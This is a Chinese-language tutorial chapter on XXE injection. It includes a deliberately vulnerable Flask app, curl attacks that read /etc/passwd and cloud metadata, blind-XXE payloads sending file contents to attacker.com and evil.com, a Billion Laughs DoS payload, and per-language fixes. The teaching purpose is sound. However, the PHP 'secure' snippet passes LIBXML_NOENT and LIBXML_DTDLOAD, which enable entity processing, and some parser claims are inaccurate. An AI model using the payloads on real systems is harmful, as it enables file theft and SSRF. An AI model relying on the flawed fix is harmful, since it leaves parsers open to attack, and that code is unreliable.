# XXE 外部实体注入（XML External Entity）

> **一句话定义**：攻击者利用 XML 解析器对外部实体的支持，读取任意文件、发起 SSRF 或执行拒绝服务攻击。

**危险等级**：🟡 高危
**OWASP Top 10 2017**：A04 — XXE（第 4 位，2021 年合并到 Injection 大类）

---

## 原理深度分析

### 为什么发生

XML 规范允许定义外部实体（External Entity），可以引用外部文件或 URL。当 XML 解析器启用外部实体解析且未做限制时，攻击者可以通过构造恶意 XML 来：

1. **读取本地文件**：`file:///etc/passwd`
2. **发起内网请求**：SSRF 探测内部 IP
3. **DoS 攻击**：Billion Laughs 攻击
4. **利用协议处理**：`expect://id`（PHP 的 expect 扩展）

### 核心概念

```xml
<!-- 内部实体 -->
<!ENTITY author "Foo">

<!-- 外部实体 — 读文件 -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- 外部实体 — 发请求 -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- 参数实体（用于盲注外带数据） -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfil;
```

---

## 真实世界案例

### 案例 1：Facebook XXE 漏洞（2017）

研究员通过 XXE 读取了 Facebook 服务器的本地文件。

- **攻击方式**：上传 XML 文档到 Facebook 的 SVG 解析器
- **利用**：读取了 `/etc/passwd` 和内部配置文件
- **奖励**：$5,000 赏金
- **教训**：任何接收 XML 的接口都必须禁用外部实体

### 案例 2：微信支付 XXE 漏洞（2018）

微信支付的某些接口曾被曝存在 XXE 漏洞。

- **攻击方式**：在 XML 格式的请求中注入外部实体
- **后果**：读取服务器文件，存在商务数据泄露风险
- **教训**：金融系统的 XML 接口必须严格配置解析器

---

## 简单 POC

### 靶场代码

```python
# app.py — 有 XXE 漏洞的 XML 解析
from flask import Flask, request
import xml.etree.ElementTree as ET
import defusedxml.ElementTree as DET

app = Flask(__name__)

@app.route('/parse-user', methods=['POST'])
def parse_user():
    xml_data = request.data
    
    # 🔴 漏洞：使用不安全的 XML 解析器
    root = ET.fromstring(xml_data)
    
    # 假设期望的格式：<user><name>Alice</name></user>
    name = root.findtext('name', 'Unknown')
    return f"Hello, {name}!"

@app.route('/parse-order', methods=['POST'])
def parse_order():
    xml_data = request.data
    
    # 🔴 漏洞2：使用 XML 扩展库处理
    from lxml import etree
    tree = etree.parse(xml_data)
    return "Order processed"

if __name__ == '__main__':
    app.run(port=5010)
```

### 攻击演示

```bash
# 1. 正常请求
curl -X POST "http://localhost:5010/parse-user" \
  -H "Content-Type: application/xml" \
  -d '<user><name>Alice</name></user>'

# 2. XXE — 读取 /etc/passwd
curl -X POST "http://localhost:5010/parse-user" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>'

# 3. XXE — SSRF 探测内网
curl -X POST "http://localhost:5010/parse-user" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user><name>&xxe;</name></user>'
```

### Blind XXE — 带外数据泄露

```xml
<!-- blind-xxe.xml — 盲注，通过 HTTP 外带数据 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<user>&send;</user>
```

`evil.dtd`（放在攻击者服务器上）：

```xml
<!ENTITY send SYSTEM "http://attacker.com/exfil?data=%file;">
```

### Billion Laughs（DoS 攻击）

```xml
<!-- Billion Laughs — 指数级膨胀导致内存耗尽 -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  ...（继续到 lol9 或更多）
]>
<root>&lol9;</root>
```

---

## 修复方案

### 方案 1：禁用外部实体（最推荐）⭐⭐⭐⭐⭐

```python
# ✅ 使用安全的解析器（每种语言都有对应的安全方案）

# Python — 使用 defusedxml（推荐）
import defusedxml.ElementTree as DET

@app.route('/parse-user-fixed', methods=['POST'])
def parse_user_fixed():
    xml_data = request.data
    # defusedxml 默认禁用所有外部实体
    root = DET.fromstring(xml_data)
    name = root.findtext('name', 'Unknown')
    return f"Hello, {name}!"

# 其他安全操作
from defusedxml import (
    minidom,     # xml.dom.minidom 的安全版本
    sax,         # xml.sax 的安全版本
    pulldom,     # xml.dom.pulldom 的安全版本
)
```

**各语言的安全配置：**

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 禁用外部实体
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
```

```php
// PHP
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
```

```csharp
// C#
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
using (XmlReader reader = XmlReader.Create(new StringReader(xml), settings)) {
    // 安全解析
}
```

```javascript
// Node.js
const { XMLParser } = require('fast-xml-parser');
const parser = new XMLParser({
    processEntities: false,
    htmlEntities: false,
});
```

### 方案 2：使用 JSON 替代 XML ⭐⭐⭐⭐

```python
# ✅ 最简单的修复：不使用 XML
from flask import request, jsonify

@app.route('/parse-user-json', methods=['POST'])
def parse_user_json():
    data = request.get_json()
    name = data.get('name', 'Unknown')
    return jsonify({"message": f"Hello, {name}!"})
```

> JSON 解析器不存在外部实体注入问题。如果业务允许，优先使用 JSON。

### 方案 3：输入验证（辅助方案）⭐⭐⭐

```python
import re

def sanitize_xml(xml_data):
    """移除 XML DOCTYPE 声明"""
    # 移除 <!DOCTYPE ... > 和 <!ENTITY ... >
    clean = re.sub(r'<!DOCTYPE[^>]*>', '', xml_data)
    clean = re.sub(r'<!ENTITY[^>]*>', '', clean)
    return clean

# 不建议单独使用，应该配合安全解析器
```

---

## 检测与防御工具

| 工具 | 用途 |
|------|------|
| [XXE Detector](https://github.com/Mygod/XXE-Detector) | Python XXE 检测库 |
| [xxexploiter](https://github.com/luisfontes19/xxexploiter) | XXE 利用工具 |
| Burp Suite | 被动扫描自动检测 XXE |
| OWASP ZAP | 主动扫描 XXE |

---

## 延伸阅读

1. [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
2. [PortSwigger XXE 教程](https://portswigger.net/web-security/xxe)
3. [Billion Laughs 攻击详解](https://en.wikipedia.org/wiki/Billion_laughs_attack)
4. [Python defusedxml 文档](https://pypi.org/project/defusedxml/)
5. [OWASP Testing Guide — XXE](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

*上一篇：[文件上传漏洞（File Upload Vulnerability）](08-file-upload.md)*

*下一篇：[反序列化攻击（Deserialization Attack）](10-deserialization.md)*
